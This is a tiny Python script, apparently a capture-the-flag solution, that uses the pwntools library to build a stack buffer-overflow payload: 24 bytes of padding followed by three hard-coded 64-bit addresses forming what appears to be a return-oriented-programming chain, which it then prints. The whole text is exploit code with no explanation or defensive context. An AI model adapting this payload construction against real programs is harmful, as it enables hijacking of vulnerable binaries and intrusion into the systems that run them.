from pwn import *
payload = "a"*24 + p64(0x4003ff) + p64(0x0000000000400893) + p64(0x006010a0)
print(payload)